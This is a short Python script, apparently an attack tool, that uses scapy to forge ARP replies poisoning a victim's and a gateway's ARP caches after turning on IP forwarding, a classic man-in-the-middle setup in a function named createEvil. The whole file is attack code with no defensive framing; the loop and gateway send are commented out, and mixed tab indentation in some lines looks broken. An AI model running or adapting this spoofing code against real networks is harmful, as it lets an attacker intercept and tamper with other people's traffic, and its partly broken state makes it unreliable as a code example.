#!/usr/bin/env python

import os
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

def createEvil(victimip, gatewayip, victimMAC, gatewayMAC):
  # Turn on IP forwarding to allow packets to pass to the final destination
  os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
	  
  
  # Create the fake ARP packet to send to the victim
  arp_victim = ARP()
  arp_victim.op=2
  arp_victim.psrc=gatewayip
  arp_victim.pdst=victimip
  arp_victim.hwdst=victimMAC

  
  # Create the fake ARP packet to send to the gateway
  arp_gateway = ARP()
  arp_gateway.op=2
  arp_gateway.psrc=victimip
  arp_gateway.pdst=gatewayip
  arp_gateway.hwdst=gatewayMAC
  
  
  ## Create a loop to send the "fake" packets
  #while True:
  send(arp_victim, verbose=0)
  #send(arp_gateway, verbose=0)
	#filter_pkts = 'arp and host ' + gatewayip + ' or host ' + victimip
	#sniff(filter=filter_pkts, count=1)
  
  # Turn off IP forwarding once the transform is complete (just housekeeping really)
  #os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')